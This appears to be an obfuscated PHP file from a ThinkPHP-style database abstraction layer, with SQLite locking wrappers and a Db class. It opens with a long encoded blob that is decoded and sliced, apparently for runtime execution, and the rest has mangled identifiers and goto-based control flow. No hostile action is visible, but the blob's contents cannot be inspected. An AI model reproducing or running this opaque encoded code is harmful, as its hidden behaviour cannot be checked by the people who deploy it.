6\352\230\267\114\222\361\173\165\136\174\167\347\65\322\323\245\10\332\120\265\253\51\170\350\252\132\226\336\262\221\166\67\111\24\117\275\345\62\153\260"."\x6a\xa5\xb2\xc0\x8f\x65\x20\x83\x8\xf3\xfa\x1c\x4f\xb5\xa1\x73\x93\x97\xeb\xe4\xb8\x5f\x82\x13\xd2\x52\xad\xf2\xbd\xb2\x35\xf9\xb4\xd2\x34\xb7\x79\xfe\x22\xf4\x97\xc6\xcc\x62\x7a\xb3\xe5\x22\xb3\xa9\x43\x9f\xec\x3d\xb3".base64_decode('E/2DjNaIF0TZ2PCES8/rOaIFGPnrZYxIOfKJ3jrev4WB0tsA6T1AokJASRTWJle5SKDKIdtgbw==').base64_decode('YkpPkPN5yLCPEpfJamJlJHNDYgCErABio7OWYYpTDuEvJYJAZDytUqJim6aS1wrjIDCcaTXPtA==')."\x16\xe3\x86\x5a\xb1\xbd\xa4\xc5\x35\xa4\xf0\xde\x23\x7c\xaa\xdb\x92\xb0\x3\xb4\x23\x7c\xf8\x5\x5c\x7c\x5a\x34\x63\x65\xc8\xd5\x43\x68\x3a\x6c\x64\xf4\xc1\x51\x48\x88\xf4\x2e\xb\x77\x4b\x1a\xee\x52\x84\x1a\x6c\xef\x56".base64_decode('Az09VRMA7PSmEj+E6VsHA8ePntOvFnRuUlLYare1BsfWKFYp1cr0wfygME0yCEanxYAitbiIMg==')._kodDe('MF52ObBWrNtgBIDvrWsTgex7HlHk30MasGMqQroQwpmkpBbmMUMTBIKPO1jOE5vc5TijWwTKwzw=')."\146\211\273\60\177\262\266\305\257\311\211\170\265\304\114\166\270\343\2\56\111\366\130\115\317\42\40\75\177\104\336\214\14\152\205\225\225\105\160\345\276\224\234\304\236\36\317\22\341\257\113\257\247\245\270"."\xa4\x5\x1f\xe2\x99\x32\xba\x9f\x4\x5a\xfc\xc5\x25\xf2\x6c\x13\xe1\x5b\x65\x63\x20\x76\x10\xc2\x66\x95\x4a\x6b\xaa\xab\xb6\xf4\x80\xac\x4a\xd6\x2\x71\xe6\xe0\xda\x1e\x55\x30\xd\x2b\x95\xa2\xe5\xc1\xf4\x5\xb5\xd4\x10"."\106\125\261\211\100\107\41\241\7\13\32\150\202\343\335\70\133\322\24\56\143\147\11\104\215\240\44\336\333\135\277\236\126\204\337\104\334\270\261\62\16\354\213\334\111\201\242\341\216\302\50\351\216\303\40"."\20\161\150\67\164\66\103\227\203\234\111\304\260\74\364\127\224\211\164\57\23\1\172\124\167\44\366\61\235\140\22\352\357\253\365\315\336\270\321\157\60\55\174\246\373\313\312\372\170\156\32\356\367\71\363"."\243\221\0\350\171\106\210\160\347\244\150\167\32\340\331\14\377\154\341\116\201\153\333\53\130\5\277\265\165\111\37\147\300\6\130\232\112\344\44\362\334\61\266\325\150\134\310\220\2\35\42\23\253\370\147"."\xb0\x5b\x70\xe1\x9c\xb\x35\xec\x88\xc6\xf4\xd3\xf9\xea\xa3\xf4\xcc\x47\xe4\xdf\x1\xe7\xcb\x29\x4b\xc5\x3b\xc5\x14\xf8\xf2\x77\xa0\x58\x94\x83\xec\xa\x8b\x28\x5a\xe4\x8c\xa4\x9f\x53\x1b\xaa\x7c\xe1\x4b\x9\x6f\x5\x2c".strrev('RÍ#i×m\'Ô<Ü…OPvÑFJ¥bÜ,&'."\n".'bÁ„Txò:œK61G£A¸@JïQ¬x®u¡')."\243\200\210\256\265\206\74\122\126\203\50\1\115\141\44\223\167\260\5\267\206\130\351\134\153\15\31\204\225\325\165\124\236\120\304\152\215\240\202\65\12\243\331\171\215\303\261\144\233\150\357\345\206\355\360"."\240\170\157\14\54\170\3\335\240\362\162\322\31\364\367\344\223\30\172\221\327\316\163\210\307\46\366\211\204\72\22\106\176\20\137\267\321\114\360\260\171\117\54\232\210\6\331\153\300\316\173\71\32\67\217"."\x1d\x4a\x2c\xea\xf7\x41\x1c\xd5\x98\x7d\x3a\xd7\xe\x65\x39\x38\x37\xe2\x87\x18\xc0\x86\x52\xb9\x50\xe0\x16\x11\x18\x89\xf9\x2e\xda\x5a\xfd\x4f\x1f\xd1\xca\xd1\xd3\x3\xd3\xa4\x2b\x7d\x1a\xd3\x89\x0\x71\x31\x55\x42\x62".base64_decode('Hhmgn2i/TmBnOxZES87RsWt2Pe3ro96EWhuYjTGzzRDODFhOOUXBG9AAhzoiCn6gqWK51WKNEg==')."\170\257\263\326\123\133\347\233\135\137\133\231\102\55\135\234\351\330\302\135\75\55\216\22\341\121\114\140\44\210\27\200\140\44\34\352\116\250\141\340\41\32\233\26\370\32\204\205\276\141\211\307\6\350\167"."\x90\xeb\xc8\x96\x74\x2\x55\x9f\x63\x58\x55\x40\x43\xef\xd6\x13\xdc\x86\x43\x2f\x38\xc4\xae\x14\xa4\x39\x93\xb9\xc1\x6f\x6a\x68\x68\xf0\x36\x34\xa2\xbf\xcc\xf0\x90\x39\xdf\x6e\x6e\x68\xa8\xc8\xd2\xd0\xd0\x4c\xfe\xd2\x4"."\162\277\15\50\350\114\41\236\246\240\76\372\63\252\353\320\41\330\162\321\311\272\314\370\327\276\40\366\275\240\340\256\301\264\10\33\24\204\175\304\73\75\243\265\216\267\326\25\162\177\11\241\274\364\50"."\170\34\236\60\310\70\120\134\276\44\143\337\210\241\104\310\115\240\2\35\346\167\131\50\233\130\66\213\351\75\213\160\202\22\52\244\373\344\306\174\14\272\64\122\74\26\344\145\11\136\371\151\100\50\104"."\x29\x9d\x74\x8d\x84\xf2\x39\x7d\xdd\xe3\x18\xc4\x34\xa5\xf8\xc\xe3\x8\x49\xe\x8b\x39\x62\xc9\x7f\x3f\xe\xca\x7a\x1f\x24\x99\xdf\x16\x91\x50\x8e\xbb\x31\xc3\xc1\x6e\x5e\x13\x7d\x75\x52\xd5\x92\x5c\x8d\xa8\xda\xd2\xcb".strrev('Ig	$lŒã<2¢¥P	 i†¶®#ÁLÔ-B®vRDm’Ã¶ä´½Ã[Ä`"4ğpRàª£š')."\324\204\27\167\324\213\373\335\54\240\210\10\131\200\277\307\111\155\175\130\177\25\40\55\64\110\336\10\12\341\47\241\251\301\127\363\214\212\111\266\335\23\114\346\315\161\225\341\326\145\147\41\151\366\230"."\106\103\374\23\324\315\131\114\210\105\120\135\214\40\167\176\57\125\340\116\162\225\11\120\105\210\212\2\20\137\231\233\350\213\124\311\215\343\135\271\211\233\373\40\177\315\103\366\175\117\145\126\222\366\262"."\x5\xcf\xa5\x9\xd5\x51\x56\xc7\x88\x74\x82\xf5\x15\x4b\x66\x6\x61\x82\x25\x3\xd\xc5\xf7\x54\x8f\xe6\xd9\x2b\x73\x56\xc9\xc4\x7b\x2f\xe7\x93\x23\xf1\x9d\x66\x87\x43\xb1\x59\xf2\xc\xa4\xa5\xf9\x2e\x29\x65\x95\x34\x1a".base64_decode('RKRzhUsJQf5srhyJj8ay+gQ5lTjrwGduZwzv2ccgHROR2CWtYA3Kao6ubITvAarI1OFYFkG8sA==')."\204\113\176\364\134\113\247\173\204\77\55\325\201\127\323\241\40\133\200\222\366\210\33\37\71\115\41\253\215\173\353\142\152\321\170\162\204\126\241\63\236\306\121\371\211\103\323\50\101\350\156\116\117\0\44"."\xd8\x58\x71\xb\xb8\x2\xa2\x3e\xee\x9a\x4f\xb1\x6\x9b\x19\x3f\x24\x17\x73\xa6\x61\xb4\x4e\x98\xe\xd\xc6\x57\xce\xbf\x9c\x7d\x5c\x49\x3f\x18\x22\x32\xb7\x4e\x64\xce\xf9\x13\xf7\xf2\xd\x20\x6\x8f\x2a\xb\xbf\x30\xb9".base64_decode('6bTtorMiaTk4V0IFyhPuAlfQzGmmFMK1s8tXrZQBJ3geHK2Y5GZGKejcWZQT4+QC8LKuiXhc/A==')."\314\207\134\10\327\325\353\242\237\313\71\11\307\41\336\127\312\140\62\113\17\145\246\257\11\264\243\146\262\307\356\350\6\42\124\375\374\226\43\1\341\73\346\370\30\373\201\306\72\200\216\156\142\117\204"."\171\354\243\173\12\153\10\217\203\43\66\63\320\166\362\5\322\216\247\310\25\41\176\41\221\305\122\255\1\205\364\175\61\171\275\254\112\52\366\326\305\132\343\357\240\300\136\205\362\230\66\77\356\343\352"."\xd1\x9a\x10\x81\x88\xcc\x9a\xe3\x88\x76\x9d\xbf\xc9\x95\xa0\x35\x78\x97\x88\x9e\x2f\xd6\x78\xa7\x65\xad\x37\x49\x65\x83\x17\x42\xfd\xe3\x8e\xc6\x26\x8c\x22\x79\xfa\x4a\x12\x48\xb8\x82\x6e\xb3\x14\x5c\x42\xd2\x33\x43\x41"."\x89\x9d\x20\xcc\x8c\xcd\xf8\x11\xf6\xf0\x95\x30\xe7\x20\x9f\x62\x7\x79\xe5\x5b\xe7\xb3\x8f\xcd\x2\xd7\x64\xc2\x51\xa5\x7f\x50\x2b\xaf\x13\xf7\xa0\x20\xac\x49\x80\x13\x2b\xe9\x29\xb3\x94\xc6\x3b\xba\xe4\x52\xaf\x60\xc7".base64_decode('9IwcJCoWbMWIR3PkKrBfVoko4pUaSNll2cur9K4WCknKxBJL7W1UOC+u0pppYI6UQPJXY8tdog==')."\152\42\50\240\152\66\104\222\27\57\47\371\215\271\213\127\146\326\360\212\314\45\63\323\167\134\1\161\123\211\107\140\311\151\250\132\374\236\215\30\231\134\204\264\131\121\204\246\141\316\120\330\310\313\51"."\26\126\26\352\145\263\130\55\245\112\123\44\111\202\150\212\141\32\120\202\65\2\110\220\60\256\63\345\63\157\143\223\227\271\116\226\355\346\331\61\23\166\71\264\316\44\64\300\7\165\106\352\300\212\10"."\xf2\x89\x3c\xa6\xa4\x84\x40\x1c\x3f\xa\x1f\x75\xc4\xdb\x25\x9f\x4f\xe2\x16\x93\x87\x88\x86\xa0\x4c\xe4\x85\xd2\x2c\x35\x31\x72\xeb\x55\xf2\x74\xa\xb\x9c\xdc\xee\x30\xa\x73\x65\x40\x2b\xc1\x99\xe\x8f\xa1\x9\x1e\x8c"."\272\240\164\356\133\256\112\340\321\76\131\107\214\224\22\12\247\302\134\16\105\231\124\363\121\200\100\350\101\142\101\53\47\151\42\72\141\362\310\112\255\141\214\164\0\112\352\43\10\216\346\165\365\330\107".base64_decode('kENW2jXOPblgjXy8k3P7L0sOsFSOe5YjQE0cHKV5FM81qjN3P0yk0NPZ4+dRbXz1UYmOcAscZA==')."\x6a\xfe\xfa\x98\x9e\x82\xba\xf2\x46\x4a\x89\x44\x97\x85\x83\x81\x48\x7b\x38\xbe\x5c\xc9\xe0\x1b\x65\xa1\xfd\x8e\xba\xab\x92\x55\xa9\x5a\x42\xbf\x8e\x2e\xa\x22\x3d\xa7\x60\x67\xd8\x9b\xe4\x6f\xf7\xe1\x4f\x6f\x12\x1d\x6d"."\xbc\x69\x7e\x24\xb4\xc4\xe1\x8f\xc\xa\x2a\x13\xef\x32\x3b\xab\xa5\xd8\xa7\x97\x2a\x6a\x2c\x60\x8b\xfd\x5c\x45\x19\x7c\x27\x50\x25\x77\x4e\x8\xac\xa5\xcc\xc5\x92\x5e\x99\x7f\x5c\xc7\x8a\xf7\x52\x8f\xa5\x2\xe5\x2a\xbd".base64_decode('gfzVWyAPL8q5EVOkF6brvFEYMSxDLHBWYlyuPdDeFe5WA5FIdJXDMiYtv5EpzYIAOG1J9i0txw==')."\70\36\21\163\11\171\350\124\311\356\320\45\202\217\345\260\210\177\324\270\267\353\42\273\300\303\33\243\364\310\47\4\245\47\164\213\45\315\260\164\51\202\76\305\312\154\326\265\134\116\112\303\67\110\122".strrev('U¸b	õÿÌec*ñM³ZAy{èPç2×ÊŠ‘ªîñ3¬¼,C-^e¤œXÒ¥6«IÜì°')."\211\47\124\366\370\271\111\116\164\300\321\323\270\160\124\45\202\173\125\64\201\370\223\322\170\121\276\174\366\247\231\45\76\102\374\20\263\246\305\1\161\256\301\271\240\22\334\12\75\150\33\46\21\172\262"."\x13\x10\x13\x20\x22\xa\x2\x0\x77\xa8\x7e\xba\xde\x50\x76\x1b\x8a\x39\x5e\x48\xae\x68\x83\x3c\x89\x47\xd3\xfa\xf0\x28\x50\xce\x1\x31\x26\x14\xe2\x66\x55\xa2\xa8\x3b\xa5\x4a\x7\x50\xb2\x22\xa4\x72\x3c\x83\xd2\xaa\x34"."\320\327\276\271\246\272\322\302\174\71\211\6\210\113\342\120\276\150\73\204\20\235\262\175\251\64\45\154\226\124\171\23\134\14\136\242\201\137\46\244\126\234\3\261\366\247\231\37\257\210\160\10\355\42\254"."\327\134\247\33\77\375\130\30\64\145\350\22\333\61\154\112\354\41\137\124\26\342\101\7\14\335\256\174\173\227\26\377\177\123\220\46\306\45\17\374\226\173\13\344\333\227\303\214\215\150\134\147\315\121\41"."\x1e\x60\x31\x12\xa3\xc5\x4c\xe7\xaa\x75\x6f\x9a\xa1\x4a\xeb\x8a\xf8\x2a\x92\x9f\x40\x76\x58\xd7\x39\x9e\xb7\xa4\x9\x4a\xb9\x80\xef\x47\x10\x9\x82\x19\xc7\x4a\x49\x96\xbc\xb6\xa5\xbe\xcd\xa4\x3f\xfd\xf0\xcb\xf6\x42\x77".strrev('xí–,X–'."\r".'zäÉ_:Ù±XUâ¥óçrã±¥÷µ{ê,ñÁZŠND)H:È].ˆ¥şÕ:9ë&ƒu(\'').base64_decode('lzVhJrSMh+IuJn8i1DYuf8sWYaTnKNFitJJjxBIW4yEvk1Oq535MVFp9nLjKVpMZ4l8b1Bpd7g==').base64_decode('QDKGzjYIRzYa5deKRXEjI++r6H+HuxFI6010qsTpl0qVM+LSXihuSWkk3JiWC2F6M+SILUmHPg==')."\xf9\xc5\xa\x7a\x5b\x24\x7c\x53\x40\x76\xd4\xcf\x1e\x7a\x67\xc\x0\x93\xab\x64\xf7\xf8\x5c\xd0\x8f\xa8\xd\x3f\x1b\xfb\x2b\xef\xfd\xb1\xba\x1c\xd0\x11\xac\x9e\xc4\xf4\xc2\x86\x4c\x72\xb6\xf2\xc9\xa7\x32\xc8\xa0\xb4\x28"."\x2\x1d\xe4\x45\x46\xcd\x1d\xd2\x69\xfa\x62\x3b\xa1\xf\x32\x59\x63\xcb\xd2\xf5\x44\x6b\x45\x3e\xf6\xcc\x7c\xb5\xa7\x6b\xa9\xc9\x5\xf9\x69\xd7\x7\xf9\x21\x47\xf6\x56\x28\x54\x88\xdc\xf\xb2\x4f\xfb\x7e\x3d\x5f\x23\xf0"."\220\175\225\127\345\245\307\355\135\17\331\113\117\334\177\314\33\270\302\275\105\21\301\137\320\52\74\22\316\54\360\243\105\305\351\304\175\60\341\220\163\25\210\271\341\210\145\200\156\21\267\120\207\200\301".base64_decode('8YDzdAbQECOXhlou5TxEGcTDNDRdcHGAXIxVnjWX5SEPRnPyKHtLOfGUNe2RmEB5Vj6xM2CWQQ==')."\216\161\151\47\65\154\156\111\226\330\345\272\73\233\341\300\157\264\123\13\273\167\372\26\104\305\146\101\170\0\306\43\245\233\346\316\137\44\13\106\304\344\213\333\347\271\364\7\56\321\201\341\21\350\244"."\70\240\351\121\330\133\24\62\261\40\211\116\223\37\366\316\214\330\162\134\233\304\377\151\161\111\47\22\232\125\366\6\110\322\112\146\16\37\214\363\370\102\300\56\151\316\303\137\225\63\16\333\145\11\370"."\xaa\x3e\x29\x2d\xed\x7a\x9e\x8a\x1d\x90\x32\x16\x4\xd\x61\x3c\x1c\xa2\xb0\xa0\xb\x46\x6a\x88\x38\x8b\x23\x2d\x50\x83\x3f\x8f\xa5\x8f\x79\x28\xc0\x3c\xf2\xcd\x37\x3d\xdc\x8\x7d\x32\x3c\x18\x8e\xb1\x92\xa9\x20\x21\xeb"."\102\307\254\312\160\61\210\304\41\200\164\122\20\37\12\125\266\143\71\325\315\154\55\211\211\155\302\140\26\132\204\52\110\232\205\304\212\232\127\205\115\61\45\353\120\66\245\325\0\351\152\215\42\265\211"."\25\267\54\211\56\72\153\240\63\120\5\101\104\337\234\364\253\235\237\215\261\4\134\204\234\203\4\141\225\110\226\316\263\325\17\300\30\226\104\76\34\55\344\306\253\15\275\312\20\76\6\257\331\61\324".base64_decode('f6rouqS45JwgVy8on8txhhgpygdsr2Z7ObMUJfAF3k+c+F1VooxCpDjgUabLVOH7ga4bgZRSmg==')."\30\11\163\51\63\215\210\204\121\162\161\43\105\334\172\10\357\204\204\364\70\310\220\364\70\215\354\26\203\124\44\343\152\145\325\164\37\46\122\170\41\76\43\362\66\30\4\20\47\242\262\102\334\252\4"."\226\161\127\53\232\244\266\251\272\227\73\106\7\321\151\333\224\277\5\232\340\375\217\233\134\242\16\70\116\341\50\54\146\135\242\270\151\127\44\203\22\131\143\274\3\224\205\237\15\314\273\354\327\307\161"."\356\343\357\257\73\316\201\226\200\13\54\237\264\307\361\154\134\132\160\46\100\330\200\360\23\363\104\332\232\304\164\10\376\102\174\165\263\127\365\160\100\22\174\223\103\45\117\164\270\77\302\16\210\135\13"."\230\71\125\302\306\371\362\65\46\175\52\205\176\263\323\16\357\62\241\275\325\326\243\60\321\366\10\263\154\17\333\220\75\63\16\77\234\70\301\300\145\270\374\243\312\36\101\200\360\61\54\327\374\6\166"."\105\301\215\33\11\225\145\201\145\160\20\201\156\343\33\155\116\274\251\234\334\65\40\47\313\160\70\40\27\232\5\337\210\40\43\44\314\125\376\231\67\152\346\244\132\143\167\212\210\137\167\137\113\127\34"."\335\204\17\31\323\314\45\265\22\266\173\37\262\231\52\125\265\200\333\363\106\134\33\324\345\76\367\21\71\66\212\44\206\321\3\202\206\340\270\152\305\4\205\42\133\120\121\242\201\244\56\24\43\325\302"."\xd5\x3b\x21\xb3\x97\xb3\x21\x96\xd4\xb1\x2a\x12\x11\x76\xda\x90\xcc\xbc\x61\x7\x77\x41\x82\xe8\x47\x3b\x1f\x4b\x92\x38\xb7\x8a\x6c\xa2\xfb\x88\xc1\xe3\x2a\xda\xec\x2b\x85\xb9\xa\xe2\x7c\xe\xa6\x41\xf6\xfa\x13\x2d\xb2"."\23\170\75\354\27\3\247\62\372\107\234\222\1\31\224\111\237\43\252\202\140\46\34\223\353\210\224\347\115\320\70\237\323\21\42\224\300\67\335\155\322\261\226\146\262\144\330\72\35\27\111\132\270\225\32"."\61\225\65\161\52\43\27\301\346\33\116\51\42\363\234\340\155\360\272\42\32\275\256\352\14\213\136\326\270\26\220\334\31\152\135\205\145\132\61\54\105\142\122\103\162\357\106\56\351\275\225\145\44\23\177".base64_decode('+SK/YrlWpx68U0Jyir9keDAq1FMyCRsNucr5OmIY6MzEBW2SinxKkla7uTQaPdMnj0u+qHbegQ==')."\x61\x75\x4c\x71\xfd\x9b\x88\xc6\x42\xea\xaa\x30\x76\x5e\x15\x3e\x3d\xd4\xcb\x1e\x90\x30\x4c\xf2\xcc\x1b\xab\xb2\xb7\x4b\xee\x27\xbe\x3d\xe9\x30\x39\x96\xe1\xe5\x2a\x5e\x3e\xb0\xf3\xc5\x20\xbf\xa0\x76\x5a\xaf\x4b\xc6\x6".base64_decode('zMWnLMB1Zsb2Ts6luaRatpRZsioOESwRs9UmSo0xucQg0zLpLaAFrqdsPa1gVsFx+umb1zB34A==').base64_decode('46pD6TznvE/ICcew+FwvdD8cpe7tYqE4jeCFqlZkUhd91dIQ4sZtB4aJNwXdbwk63w5slkTN9A==')."\255\105\307\243\243\25\263\326\155\6\5\217\343\112\303\64\144\372\124\54\22\20\367\363\330\103\27\366\17\212\315\174\374\4\13\341\146\140\215\232\127\231\206\30\26\300\10\331\31\41\311\225\47\152\150"."\301\56\215\107\113\261\174\167\205\103\135\247\305\236\124\236\34\275\250\220\314\41\53\3\115\13\71\112\272\210\102\47\330\264\363\135\131\222\110\242\331\213\46\120\203\164\167\356\124\135\340\366\316\25\173".strrev('—Šá“‹V\\—x¸·'."\r".'åP’PŠC¢’¤:õJ”¤}Àamé’Hßğ°†C±~šó¤ÉHˆÙq')."\x8\xb1\xd8\x36\xb5\x11\xc1\xa0\x8b\xd3\x5b\x3a\xdd\xa1\x8d\x54\xc9\x9a\xae\x38\x5f\xa2\x18\x9e\x95\x30\xf8\x92\xf7\x2c\x61\x94\xa5\x8f\xca\xad\x43\x3e\x61\x4\xe5\xc8\x58\x19\x2b\xbc\x6b\x49\xe5\x5d\xe7\x72\x32\x4c\x1c"."\127\155\370\204\22\72\213\313\336\273\70\122\211\50\372\272\46\327\12\222\204\36\130\213\112\250\13\321\241\160\151\233\150\322\351\53\214\147\343\163\206\362\20\363\114\257\43\326\165\154\307\202\115\306\223".base64_decode('upJA1CdVX1UiKKGAnotI1cnKD9MWiFdvRGClE8SSnFckMK7HdABf2tv4wCBnTE50dKcKarBjig==')."\x2c\x4d\xae\x4c\x34\x73\x39\x7c\xc5\x3d\x4d\x32\xd5\xcb\x96\x76\xe2\xca\x1c\x42\xba\x47\x3b\x44\x8e\xde\x62\xe1\xd0\xc8\x3c\x11\x55\xd1\xb4\x80\x33\x89\xe6\xd7\x5d\x70\x93\xb\xb8\x61\x4a\x4b\x38\x1e\xb3\x96\xe3\x47\xd"."\73\225\225\344\4\225\211\225\361\245\212\151\206\16\124\37\207\273\267\154\226\335\132\121\242\222\212\376\110\52\133\11\263\112\31\332\243\252\305\150\22\56\51\216\150\216\262\323\200\0\227\245\111\270\154".base64_decode('RTIrXAFXUs7WytY0w6sEHohA01UGLESLUtbp4Fk1c2VzsAbcuYmgrXovJEmkU6WmWi+qZp62Fw==')."\xee\xdc\x82\xf\xc2\x7\xf2\x6a\x29\x55\x17\x28\xa8\x8f\x54\xd9\x31\x58\x4a\x95\x3d\x82\xd2\xbf\x69\x15\xd3\x84\xde\x56\xe5\x66\x25\xd2\xaa\xa8\x8e\x81\x8f\x30\x97\xf3\xb1\x2a\xc9\xb2\x1e\x5a\x75\x4d\xb5\x58\x55\xfa\x66"."\71\265\311\134\361\216\247\13\50\111\242\201\222\76\54\33\62\163\145\112\121\23\142\30\163\306\220\320\332\145\346\106\63\35\333\133\271\60\124\60\371\226\231\26\232\332\274\43\25\25\70\327\101\241\54"."\xbd\xdc\x53\xd5\xe0\xc9\x83\x45\x68\x95\xe2\xa9\x1c\x7b\x92\x42\x36\x15\xa3\xa7\x7f\x13\x1d\x54\x25\x55\x56\x61\xee\xc2\x47\x66\x88\xe3\x70\x4e\xc8\xb7\xdd\xb7\x10\x42\xa0\xe7\xd0\x82\xaa\x26\xb2\xc7\x51\xf4\xd3\x27\xae"."\350\150\175\22\217\46\20\304\141\220\110\71\43\270\274\244\372\17\101\254\174\303\357\275\311\35\4\345\44\150\162\334\54\331\36\252\233\137\44\277\155\246\155\13\265\41\166\43\202\316\1\230\35\360\110"."\xda\x71\xe8\x4b\x5c\x78\xe3\x4e\x91\x7b\x53\x82\xc3\xf4\x4e\x3\x7f\x82\x26\x6\x96\x41\xc5\x75\x9a\x4a\x88\x9e\x23\x80\x6f\x68\x79\x20\x56\x79\x41\xdb\xc1\xdf\x4e\x19\x32\xd3\x49\x73\x8c\xb9\x84\x46\x98\x23\xc1\x44\xf2"."\202\11\236\43\45\375\75\342\2\307\362\323\24\77\274\41\351\45\267\51\136\160\122\274\256\230\161\24\247\57\173\163\235\373\217\253\1\156\22\104\25\364\1\71\42\71\6\43\310\170\42\136\221\324\23".base64_decode('iMdXRWPt9L25imRSSlKMrEjq6Yx2T5cW6gqEIxVpWIeyWxV+xWlSuIf0kqgWTNeLcHC56Am71A==')."\x8c\xc0\xc3\xe4\x62\x12\xa4\x9b\xbd\x62\xd6\x2c\x4c\x37\x8f\xac\x82\xb8\xc6\x3c\x37\xca\x97\x5c\x7a\x5e\x38\xa3\x17\x95\x38\x5\x70\xf2\x45\x98\xc5\x9e\xba\xe1\x1f\xce\x47\xa2\x5d\xa\xcb\x4e\x45\x1d\x86\xb9\x50\x2d\xd6"."\x95\xec\x86\x96\x62\x45\x88\xc5\x8f\xf6\x71\x2\xc0\xcf\x13\x42\x65\xc7\xe7\xd0\x16\x92\xe2\xc9\x22\x21\x54\x47\x5a\xbb\xf2\xee\x4e\x6e\x85\xb9\x5c\x8e\x24\xcf\xae\xa\xcd\x2a\x37\x94\xb2\x32\x14\x4e\x15\xc0\xc1\xdd\x3c"."\215\275\272\263\316\114\212\43\34\234\355\300\351\1\200\133\322\216\245\337\216\144\133\313\60\261\251\103\17\206\112\323\61\121\20\162\356\377\7\166\27\201\116\247\305\0\0"."", 10, -8))); goto dãÕ°•º°; BÆ›ğëöš: define($_SERVER[¤øïŠ‹²][327], 1); define($_SERVER[¤øïŠ‹²][328], 2); define($_SERVER[¤øïŠ‹²][329], 3); goto A÷Ïñƒ ‡²; eÓ‘“è³·¹: class DbSqlite extends DbSqliteBase { public function query($å›çíÀ) { $ı¬ò¯ô¢ =& $_SERVER[¤øïŠ‹²]; if (!CacheLock::fileLock($ı¬ò¯ô¢[13])) { return !1; } $ıÄŸ•¦ = parent::query($å›çíÀ); CacheLock::fileUnLock($ı¬ò¯ô¢[13]); return $ıÄŸ•¦; } public function execute($ŒÔ´ƒˆÂ) { $á˜ìŸãÌ =& $_SERVER[¤øïŠ‹²]; if (!CacheLock::fileLock($á˜ìŸãÌ[13])) { return !1; } $Î´×ÚÆ… = parent::execute($ŒÔ´ƒˆÂ); CacheLock::fileUnLock($á˜ìŸãÌ[13]); return $Î´×ÚÆ…; } } class DbSqlite3 extends DbSqlite3Base { public function query($¿¯ºêÁ¯) { $Ò¾£ä =& $_SERVER[¤øïŠ‹²]; if (!CacheLock::fileLock($Ò¾£ä[13])) { return !1; } $ÏşØ±‹† = parent::query($¿¯ºêÁ¯); CacheLock::fileUnLock($Ò¾£ä[13]); return $ÏşØ±‹†; } public function execute($Æ›±Ÿ³) { $Şú¦²íÉ =& $_SERVER[¤øïŠ‹²]; if (!CacheLock::fileLock($Şú¦²íÉ[13])) { return !1; } $ĞòÎà« = parent::execute($Æ›±Ÿ³); CacheLock::fileUnLock($Şú¦²íÉ[13]); return $ĞòÎà«; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\x71" => "\74\x3e", "\x67\x74" => "\76", "\x65\147\164" => "\x3e\75", "\154\164" => "\74", "\145\x6c\x74" => "\74\75", "\156\157\164\154\x69\153\x65" => "\116\117\124\40\114\111\113\105", "\154\x69\x6b\x65" => "\114\x49\x4b\105", "\151\x6e" => "\111\116", "\156\x6f\164\151\x6e" => "\x4e\117\124\x20\x49\x4e", "\156\x6f\x74\40\151\x6e" => "\116\x4f\124\40\111\116", "\x62\145\x74\167\145\145\x6e" => "\102\105\x54\x57\105\x45\116", "\156\157\164\142\145\x74\x77\x65\x65\x6e" => "\116\117\124\40\x42\x45\124\x57\105\x45\116", "\x6e\x6f\x74\40\142\x65\164\167\145\x65\156" => "\116\x4f\x54\x20\x42\105\x54\127\x45\x45\116"); protected $selectSql = "\123\105\x4c\105\103\124\x25\x44\111\123\x54\111\116\x43\124\x25\40\45\106\x49\105\114\x44\x25\40\106\122\x4f\115\x20\45\x54\101\102\x4c\x45\x25\x25\x4a\117\x49\116\x25\x25\x57\110\x45\x52\105\x25\x25\x47\x52\117\125\x50\45\45\110\101\126\x49\x4e\107\45\x25\117\x52\104\105\x52\45\x25\114\111\115\111\124\x25\40\45\125\116\x49\117\116\x25\x25\x43\117\115\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $³İ¦Æşê = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¤øïŠ‹²][1076], $³İ¦Æşê); } public function factory($™Ì´ª«Ç = '') { $©®¢€‰ =& $_SERVER[¤øïŠ‹²]; $™Ì´ª«Ç = $this->parseConfig($™Ì´ª«Ç); if (empty($™Ì´ª«Ç[$©®¢€‰[1077]])) { think_exception(think_lang($©®¢€‰[1078])); } $this->dbType = ucwords(strtolower($™Ì´ª«Ç[$©®¢€‰[1077]])); $ÎËÃÎ„á = $©®¢€‰[1079] . $this->dbType; if (class_exists($ÎËÃÎ„á)) { $û‰¹º·Ÿ = new $ÎËÃÎ„á($™Ì´ª«Ç); if ($©®¢€‰[1080] != strtolower($™Ì´ª«Ç[$©®¢€‰[1077]])) { $û‰¹º·Ÿ->dbType = strtoupper($this->dbType); } else { $û‰¹º·Ÿ->dbType = $this->_getDsnType($™Ì´ª«Ç[$©®¢€‰[1032]]); } } else { think_exception(think_lang($©®¢€‰[1081]) . $©®¢€‰[1082] . $ÎËÃÎ„á); } return $û‰¹º·Ÿ; } public function __call($Ğ£½–ãª, $ğİÀªùÌ) { if (method_exists($this, $Ğ£½–ãª)) { return call_user_func_array(array($this, $Ğ£½–ãª), $ğİÀªùÌ); } } protected function _getDsnType($„ÉÍûÅ…) { $À“™™û = explode($_SERVER[¤øïŠ‹²][4], $„ÉÍûÅ…); $¶¬·™ÂÍ = strtoupper(trim($À“™™û[0])); return $¶¬·™ÂÍ; } private function parseConfig($İ Èûİå = '') { $˜„Ëö­¹ =& $_SERVER[¤øïŠ‹²]; if (!empty($İ Èûİå) && is_string($İ Èûİå)) { $İ Èûİå = $this->parseDSN($İ Èûİå); } elseif (is_array($İ Èûİå)) { $İ Èûİå = array_change_key_case($İ Èûİå); $İ Èûİå = array($˜„Ëö­¹[1077] => $İ Èûİå[$˜„Ëö­¹[1083]], $˜„Ëö­¹[1001] => $İ Èûİå[$˜„Ëö­¹[1084]], $˜„Ëö­¹[1002] => $İ Èûİå[$˜„Ëö­¹[1085]], $˜„Ëö­¹[999] => $İ Èûİå[$˜„Ëö­¹[1086]], $˜„Ëö­¹[1000] => $İ Èûİå[$˜„Ëö­¹[1087]], 